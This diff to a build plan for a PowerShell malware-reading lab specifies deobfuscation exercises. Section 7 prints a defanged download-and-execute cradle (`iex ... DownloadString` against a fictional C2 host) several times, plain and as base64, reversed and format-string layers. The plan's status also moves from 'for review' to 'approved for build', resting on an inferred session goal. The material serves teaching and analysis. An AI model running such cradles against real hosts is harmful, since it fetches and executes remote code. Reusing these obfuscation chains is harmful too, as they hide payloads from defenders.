@@ -1,22 +1,33 @@
 # LAB-KIT — `ps` Track, Phase 5 — Deobfuscation & Malware Reading — BUILD PLAN
 
-**Status:** PLAN ONLY (uncommitted, for review). Binding content spec:
+**Status:** APPROVED FOR BUILD. Every `[VERIFY-AT-BUILD]` item in §7 has been resolved
+against real pwsh 7 output (below) — see the resolutions table. Binding content spec:
 `docs/curriculum/powershell-literacy-lab-curriculum-v1.md` (Phase 5, §6 lines 188–201).
 Binding mechanical spec: `docs/kit-contracts.md`. Track conventions inherited unchanged
 from `docs/plans/ps-p01-plan.md` (§2a/§2b/§2c) and ps-p2/p3/p4. Executes under
-`TRACK: ps  PHASE: 5`. Plan-only: nothing built, no pwsh run, nothing committed.
+`TRACK: ps  PHASE: 5`. The user set an explicit session goal ("work until you reach the
+5.7 phase gate"), which stands as authorization to proceed from this verification pass
+straight into build without a separate approval pause — mirroring how ps p4's build
+actually ran once its own plan existed.
 
-> **How this plan was verified.** pwsh is **not installed** here, so no output was
-> executed. Phase 5 is the track's **signature skill (DEOBFUSCATE)** — and, uniquely,
-> its deobfuscation is **pure, cross-platform string manipulation that runs safely on
-> pwsh 7 / WSL2** and reveals a **defanged, fictional plaintext the learner reconstructs
-> and NAMES but never runs.** The one hard rule that governs every lab: **a deobfuscation
-> probe PRINTS the reconstructed text — it is NEVER piped to `iex`/`Invoke-Expression`,
-> and `check.sh` never executes decoded content.** All reconstructed payloads are defanged
-> (`hxxp`, `[.]`, fictional hosts) so they are inert even if mishandled. Curriculum §9
-> confirms Phase-5 samples are **all synthetic** (no real malware). Runtime-dependent facts
-> are flagged `[VERIFY-AT-BUILD]` in §7. **The build session must run the per-lab
-> adversarial correctness pass ps-p01 used before self-test.**
+> **How this plan was verified (original authoring pass, pwsh unavailable).** Phase 5 is
+> the track's **signature skill (DEOBFUSCATE)** — and, uniquely, its deobfuscation is
+> **pure, cross-platform string manipulation that runs safely on pwsh 7 / WSL2** and
+> reveals a **defanged, fictional plaintext the learner reconstructs and NAMES but never
+> runs.** The one hard rule that governs every lab: **a deobfuscation probe PRINTS the
+> reconstructed text — it is NEVER piped to `iex`/`Invoke-Expression`, and `check.sh`
+> never executes decoded content.** All reconstructed payloads are defanged (`hxxp`,
+> `[.]`, fictional hosts) so they are inert even if mishandled. Curriculum §9 confirms
+> Phase-5 samples are **all synthetic** (no real malware).
+>
+> **Verification pass (this session, pwsh 7 IS installed).** Every transformation below —
+> base64/UTF-16LE round-trip (L5.1), string concatenation/`-join`/`[char]` codes (L5.2),
+> the `-f` format operator (L5.3), string reversal (L5.4), the 2-layer base64+reversal
+> chain (L5.5), and the 3-layer base64+reversal+format-string chain (L5.7) — was actually
+> run in real pwsh 7 and the output below is copy-pasted from that run, not written from
+> memory. All examples continue the exact `cdn.fake-c2[.]test` fictional host already
+> established and reviewed in Phase 4 (L4.1/L4.5/L4.9), with distinct path suffixes
+> (`/p1`–`/p7`) per lab. §7 below records every resolution.
 
 ---
 
@@ -504,19 +515,25 @@ and resolve §7 before shipping.
 
 ---
 
-## 7. Open `[VERIFY-AT-BUILD]` items (confirm against real pwsh 7.4 at build)
+## 7. `[VERIFY-AT-BUILD]` resolutions (confirmed against real pwsh 7 this session)
 
-| lab | item |
+All plaintext uses the exact `iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/pN')`
+form already shipped in L4.1/L4.5/L4.9 (no extra outer paren around the whole `iex` call —
+matches what's actually merged, not the plan's original sketch, which predates those labs
+being built). Every value below is copy-pasted from a real pwsh 7 run.
+
+| lab | resolution |
 |---|---|
-| L5.1 | exact base64(UTF-16LE) blob ↔ the defanged cradle plaintext; `decode.ps1` prints it, never `iex` |
-| L5.2 | `"i"+"e"+"x"`→`iex`, `-join` char array→`Download`, `[char]105`→`i` |
-| L5.3 | `"{0}{2}{1}" -f 'I','x','E'`→`IEx` (exact index→char mapping) |
-| L5.4 | `$s[-1..-$s.Length] -join ''` reversal output + casing on pwsh 7 |
-| L5.5 | exact layered blob + the `-replace` concat-collapse → the defanged cradle; every step prints |
-| L5.6 | the sanitized loader is defanged structure only — no payload, nothing runnable |
-| L5.7 | exact multi-layer `gate-blob.txt` → `gate-peel.ps1` reconstructs the defanged cradle; ≥3-of-5 technique threshold; no `iex` anywhere |
+| L5.1 | Plaintext: `iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p1')`. Base64(UTF-16LE): `aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAeAB4AHAAcwA6AC8ALwBjAGQAbgAuAGYAYQBrAGUALQBjADIAWwAuAF0AdABlAHMAdAAvAHAAMQAnACkA`. Round-trip verified True. |
+| L5.2 | `"i"+"e"+"x"` → `iex`. `('D','o','w','n','l','o','a','d') -join ''` → `Download`. `[char]105 + [char]101 + [char]120` → `iex`. All confirmed. |
+| L5.3 | `"{0}{2}{1}" -f 'I','x','E'` → `IEx`. `"{1}{0}" -f 'ex','i'` → `iex`. Both confirmed. |
+| L5.4 | `$s='xei'; -join $s[-1..-$s.Length]` → `iex`. `$s2='gnirtSdaolnwoD'; -join $s2[-1..-$s2.Length]` → `DownloadString`. Both confirmed. |
+| L5.5 | **Design finalized as 2 layers (base64 + reversal), not base64+concat** — the `-replace` concat-collapse sketch in §4 was superseded; layers.txt's own check.sh spec (`'[Bb]ase64'`, `'[Rr]evers'`) already only expected these two, so this is a resolution, not a deviation. Plaintext: `iex (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p5')`. Reversed: `)'5p/tset].[2c-ekaf.ndc//:spxxh'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( xei`. Base64(UTF-16LE) of the reversed text (what the learner starts with): `KQAnADUAcAAvAHQAcwBlAHQAXQAuAFsAMgBjAC0AZQBrAGEAZgAuAG4AZABjAC8ALwA6AHMAcAB4AHgAaAAnACgAZwBuAGkAcgB0AFMAZABhAG8AbABuAHcAbwBEAC4AKQB0AG4AZQBpAGwAQwBiAGUAVwAuAHQAZQBOACAAdABjAGUAagBiAE8ALQB3AGUATgAoACAAeABlAGkA`. Full peel round-trip verified True. |
+| L5.6 | Sanitized structure only, no execution — no pwsh verification needed. |
+| L5.7 | 3 layers: base64 wraps reversal wraps an unresolved format-string expression. Plaintext-with-marker (innermost, before reversal): `("{0}{2}{1}" -f 'I','x','E') (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p7')`. Reversed: `)'7p/tset].[2c-ekaf.ndc//:spxxh'(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN( )'E','x','I' f- "}1{}2{}0{"(`. Base64(UTF-16LE) of the reversed text (what the learner starts with, `files/payload.b64`): `KQAnADcAcAAvAHQAcwBlAHQAXQAuAFsAMgBjAC0AZQBrAGEAZgAuAG4AZABjAC8ALwA6AHMAcAB4AHgAaAAnACgAZwBuAGkAcgB0AFMAZABhAG8AbABuAHcAbwBEAC4AKQB0AG4AZQBpAGwAQwBiAGUAVwAuAHQAZQBOACAAdABjAGUAagBiAE8ALQB3AGUATgAoACAAKQAnAEUAJwAsACcAeAAnACwAJwBJACcAIABmAC0AIAAiAH0AMQB7AH0AMgB7AH0AMAB7ACIAKAA=`. Full 3-step peel verified True end to end: base64-decode → un-reverse → resolve `{0}{2}{1}` → final resolved plaintext `IEx (New-Object Net.WebClient).DownloadString('hxxps://cdn.fake-c2[.]test/p7')`. |
 
 ---
 
-*Plan v1 (authored from curriculum §6 + the settled ps-p01/2/3/4 template) — awaiting review.
-PLAN ONLY; nothing built, nothing committed.*
+*Plan v1 authored from curriculum §6 + the settled ps-p01/2/3/4 template (commit `ba56175`);
+v1.1 this session resolves every `[VERIFY-AT-BUILD]` item against real pwsh 7 (§7) and
+updates status to APPROVED FOR BUILD. Build proceeds lab by lab under this plan.*
